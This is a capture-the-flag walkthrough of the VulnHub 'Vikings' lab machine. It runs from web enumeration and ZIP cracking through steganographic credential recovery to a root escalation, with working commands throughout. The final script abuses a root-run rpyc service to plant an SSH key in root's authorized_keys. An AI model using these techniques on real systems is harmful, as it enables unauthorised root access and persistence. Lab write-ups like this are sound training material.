# [Vikings](https://www.vulnhub.com/entry/vikings-1,741/)

An `nmap` scan reveals SSH on port 22 and a web server on port 80. Looking at the web site on port 80, we have directory listing on the landing page with a single entry `/site/`. Navigating there, we just have a static HTML page. With nothing special on the page, we run `gobuster`.

```sh
$ gobuster dir -u "http://192.168.56.103/site/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt -r

/css                  (Status: 200) [Size: 1376]
/images               (Status: 200) [Size: 1360]
/index.html           (Status: 200) [Size: 4419]
/js                   (Status: 200) [Size: 951]
/war.txt              (Status: 200) [Size: 13]
```

We have the file `war.txt` whose content is `/war-is-over`. Going to `/war-is-over`, we get what looks like a long base64-encoded string, which we decode to get an archive which we can try extracting with `7z x`. However, the archive is password-protected so we crack it with `john`.

```sh
zip2john war.zip > war.john
john war.john --wordlist=~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

We should then get the password "ragnarok123" with which we can extract the archive. The extract file `king` is a JPEG image with a lot of EXIF data. Running `binwalk` reveals some more ZIP data which we can extract.

```sh
$ binwalk -e king

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, big-endian, offset of first image directory: 8
1429567       0x15D03F        Zip archive data, at least v2.0 to extract, compressed size: 53, uncompressed size: 92, name: user
1429740       0x15D0EC        End of Zip archive, footer length: 22
```

The extracted directory `_king.extracted/` has a ZIP archive and a text file `user` with the following contents.

```
//FamousBoatbuilder_floki@vikings
//f@m0usboatbuilde7
```

These are credentials. We can now log into SSH as `floki` with the password `f@m0usboatbuilde7`.

In floki's home, we have `.viminfo`. Checking the contents, we see an interesting python file: `/usr/local/bin/rpyc_classic.py`. We currently can't run it, however, so we make note of it for later.

Also in floki's home, we have `readme.txt`.

```
_______________________________________________________________________Floki-Creation____________________________________________________________________________________________________

I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don't know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.
Because it was I who was leading all the Vikings. I need to find him. He can be anywhere.
I need to create this `boat` to find Ragnar
```

The note tells us there's someone named "Ragnar", which we note as a possible username. We also have the file `boat`.

```
#Printable chars are your ally.
#num = 29th prime-number.
collatz-conjecture(num)
```

It's telling to print out printable characters among the numbers we get from running Collatz conjecture on the 29th prime-number, 109. I then wrote a python script to do just that.

```python
#!/usr/bin/python3

n = 109
chars = [n]
while n != 1:
    if n % 2:
        n = 3 * n + 1
    else:
        n = int(n / 2)
    if n <= 255:
        chars.append(n)

out = "".join([chr(i) for i in chars])
print(out)
```

Running it would print out some non-printable characters so we filter it with `strings`.

```sh
./num.py | strings -n 1 | tr -d '\n'
mR)|>^/Gky[gz=\.F#j5P(
```

With that, we have the password for the user "ragnar" and can SSH in as them.

We have a shell, but it's not bash (check `$SHELL`) so we upgrade with a simple `bash`.

Going back to the file `/usr/local/bin/rpyc_classic.py` from earlier, trying to run it gives us an error.

```sh
ragnar@vikings:~$ /usr/local/bin/rpyc_classic.py
[snip]
OSError: [Errno 98] Address already in use
```

It seems it's trying to bind to a port already being used. Checking listening ports ...

```sh
ragnar@vikings:~$ ss -tlnp
State         Recv-Q         Send-Q                    Local Address:Port                    Peer Address:Port
LISTEN        0              128                             0.0.0.0:80                           0.0.0.0:*
LISTEN        0              128                       127.0.0.53%lo:53                           0.0.0.0:*
LISTEN        0              128                             0.0.0.0:22                           0.0.0.0:*
LISTEN        0              128                           127.0.0.1:18812                        0.0.0.0:*
LISTEN        0              128                           127.0.0.1:39487                        0.0.0.0:*
```

... we have a couple of high ports with unknown functions. Looking at running processes for `rpyc_classic.py` ...

```sh
ragnar@vikings:~$ ps aux | grep rpyc_classic.py
root      1003  0.0  0.0   4636   864 ?        Ss   06:23   0:00 /bin/sh -c python3 /usr/local/bin/rpyc_classic.py
root      1005  0.0  2.0 133012 21176 ?        Sl   06:23   0:00 python3 /usr/local/bin/rpyc_classic.py
```

We find a couple of instances of `rpyc_classic.py` run by root. Looking at [the docs for `rpyc_classic.py`](https://rpyc.readthedocs.io/en/latest/docs/classic.html), we find that the default port for `rpyc_classic.py` is 18812 which we saw listening earlier.

Looking around the documentation for `rpyc`, I found the [`teleport` function](https://rpyc.readthedocs.io/en/latest/tutorial/tut1.html#the-teleport-method) to be useful since it allows us to execute functions on the server. With that, I wrote a script on the machine.

```python
import rpyc

def shell():
    import os
    os.system("mkdir /root/.ssh")
    os.system("echo 'YOUR_ID_RSA.pub' >> /root/.ssh/authorized_keys")

c = rpyc.classic.connect("localhost")
f = c.teleport(shell)
f()
```

Running this, our SSH key should be in root's `authorized_keys` and we can then SSH in as root.
